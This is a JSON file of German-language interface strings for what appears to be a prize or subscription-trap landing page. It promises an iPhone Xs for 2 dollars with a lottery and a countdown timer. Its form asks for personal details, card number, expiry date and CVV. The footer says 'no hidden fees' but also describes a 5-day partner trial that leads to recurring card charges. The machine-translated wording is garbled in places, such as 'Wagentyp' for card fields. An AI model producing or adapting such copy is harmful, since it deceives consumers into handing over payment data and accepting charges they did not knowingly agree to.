{
  "headerTitle_1": "Holen Sie sich ein neues iPhone Xs für 2 $",
  "headerTitle_2": "Das Leben ist einfacher mit dem Iphone",
  "form": {
    "title": "Verfügbare Farben",
    "firstName": "Vorname",
    "lastName": "Nachname",
    "email": "E-mail",
    "phone": "Keine Telefone",
    "city": "Platz",
    "address": "Adresse",
    "zip": "Postleitzahl",
    "agree": "Sie bestätigen, dass Sie 18 Jahre alt sind",
    "btnContinue": "Fortsetzen",
    "cartType": "Wagentyp",
    "cartNumber": "Wagentyp",
    "expirationDate": "Haltbarkeitsdatum",
    "name": "Name",
    "cvv": "cvv",
    "btnConfirm": "Bestellen Sie jetzt"
  },
  "counterTitle": "Apple Iphone Xs",
  "counterVal": "Wert",
  "counterPay": "Zahlen Sie nur 2 $",
  "counterTime": "Verbleibende Zeit",
  "footerTitle": "Versuchen Sie noch heute, Iphone Xs zu gewinnen und an der Lotterie teilzunehmen. Der glückliche Gewinner wird per E-Mail benachrichtigt.",
  "footerQues_1": "Wie kann ich gewinnen?",
  "footerDesc_1": "Dank Ihrer Mitgliedschaft nehmen Sie auch an unserem Gewinnspiel teil. Wir werden alle 600 Teilnehmer einen Gewinner ziehen. Der nächste Gewinner wird am 02.05.2019 gezogen und direkt per E-Mail benachrichtigt. Wenn die Belohnung nicht vorrätig ist, erhält der Gewinner stattdessen ein ähnliches Produkt von gleichem oder höherem Wert.",
  "footerQues_2": "Keine versteckten Gebühren",
  "footerDesc_2": "Wir stellen sicher, dass unsere Mitglieder einen detaillierten Transaktionsverlauf bereitstellen, damit sie wissen, was sie bezahlen. Kreditkarteninformationen werden nur benötigt, um zukünftige Einkäufe zu erleichtern. Wenn Sie nicht auf die PREMIUM-Mitgliedschaft upgraden und keinen Kauf tätigen, wird Ihre Kreditkartenabrechnung nicht belastet.",
  "footerQues_3": "Warum benötigen wir Ihre Zahlungsinformationen?",
  "footerDesc_3": "Wenn Sie diesem Service beitreten, erhalten Sie eine 5-tägige Testversion des Programms unseres Partners. Wenn Sie mit einem Abonnement über die 5-tägige Testperiode hinaus fortfahren, wird Ihnen ein Betrag von Ihrer Kreditkarte belastet, der je nach Auswahl variiert. Wenn Ihr Beitrag bei der anderen Zahlungsmethode von Ihrer Kreditkarte abgebucht wird, behalten Sie Zugang zu diesen Diensten, die ausschließlich Mitgliedern vorbehalten sind, die für den Zugang auf unserer Partner-Website bezahlen."
}